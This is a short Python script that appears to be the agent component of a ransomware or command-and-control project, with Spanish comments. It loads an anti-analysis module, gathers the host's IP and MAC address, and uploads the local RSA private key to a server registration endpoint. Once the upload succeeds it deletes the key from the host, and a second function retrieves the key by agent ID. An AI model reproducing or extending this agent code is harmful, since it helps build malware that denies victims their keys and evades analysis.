import requests
import socket
import os
import antianalysis

def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

def load_private_key():
    try:
        with open("rsa_private.pem", 'rb') as f:
            private_key = f.read()
        return private_key
    except FileNotFoundError:
        print("El archivo de clave privada no fue encontrado.")
        return None
    
# Función principal del agente
def register_agent():
    # Obtener IP y MAC del agente
    ip = get_ip_address()
    mac = antianalysis.get_mac_address()
    private_key = load_private_key()
    
    if private_key is None:
        print("No se pudo cargar la clave privada. No se puede registrar el agente.")
        return
    
    # Cargar la clave privada desde el archivo
    server_url = 'http://127.0.0.1:5000/register_agent'
    
    # Crear un diccionario con los datos adicionales
    data = {
        'ip': ip,
        'mac': mac
    }
    files = {
        'private_key': ('rsa_private.pem', private_key, 'application/x-pem-file')
    }

    response = requests.post(server_url, data=data, files=files)    
    if response.status_code == 200:
        print("Agente registrado con éxito.")
        os.remove("rsa_private.pem")  # Eliminar la clave privada después de usarla
    else:
        print(f"Error al registrar el agente: {response.text}")

def download_private_key(agent_id):
    server_url = f'http://127.0.0.1:5000/view_private_key/{agent_id}'
    
    # Realizar la solicitud GET para obtener el archivo .pem
    response = requests.get(server_url)
    
    if response.status_code == 200:
        # Guardar la clave privada en un archivo en el sistema del cliente
        with open('rsa_private.pem', 'wb') as f:
            f.write(response.content)
        print("Clave privada descargada con éxito.")
    else:
        print(f"Error al descargar la clave privada: {response.text}")

# Función principal del cliente
def main():
    agent_id = 0  # Asegúrate de utilizar el ID correcto del agente registrado

    # Luego descargar la clave privada del agente
    download_private_key(agent_id)

if __name__ == "__main__":
    main()